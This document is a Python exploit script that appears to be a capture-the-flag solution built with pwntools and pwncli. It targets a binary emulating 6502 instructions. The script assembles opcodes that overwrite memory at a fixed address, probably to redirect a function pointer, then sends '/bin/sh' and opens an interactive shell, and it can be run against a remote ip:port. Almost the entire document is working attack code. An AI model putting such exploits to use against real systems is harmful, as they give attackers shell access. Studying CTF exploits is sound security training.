#!/usr/bin/env python3
# Date: 2023-11-04 17:36:50
# Link: https://github.com/RoderickChan/pwncli
# Usage:
#     Debug : python3 exp.py debug elf-file-path -t -b malloc
#     Remote: python3 exp.py remote elf-file-path ip:port

from lianpwn import *
from pwncli import *

cli_script()
set_remote_libc("libc.so.6")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
# CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)

debugB()

payload = b""


def lda_imm(arg):
    global payload
    payload += p8(0xA9) + p8(arg)


def ldx_imm(arg):
    global payload
    payload += p8(0xA2) + p8(arg)


def ldx_abs(arg):
    global payload
    payload += p8(0xAE) + p16(arg)


def stx_abs(arg):
    global payload
    payload += p8(0x8E) + p16(arg)


def sta_abs(arg):
    global payload
    payload += p8(0x8D) + p16(arg)


def adc_abs(arg):
    global payload
    payload += p8(0x6D) + p16(arg)


# DEBUG
ldx_imm(1)
stx_abs(0xFFC3)

lda_imm(0xB0)
adc_abs(0xDEF2)
sta_abs(0xDEF2)

lda_imm(0xEB - 1)
adc_abs(0xDEF2 + 1)
sta_abs(0xDEF2 + 1)

lda_imm(0xFD - 1)
adc_abs(0xDEF2 + 2)
sta_abs(0xDEF2 + 2)

ldx_abs(0xDEF2)
ldx_abs(0xDEF3)
ldx_abs(0xDEF4)


ru(b"give me the code length: \n")
s(i2b(len(payload)))
ru(b"give me the code: ")
s(payload)

s(b"/bin/sh\x00")

ia()
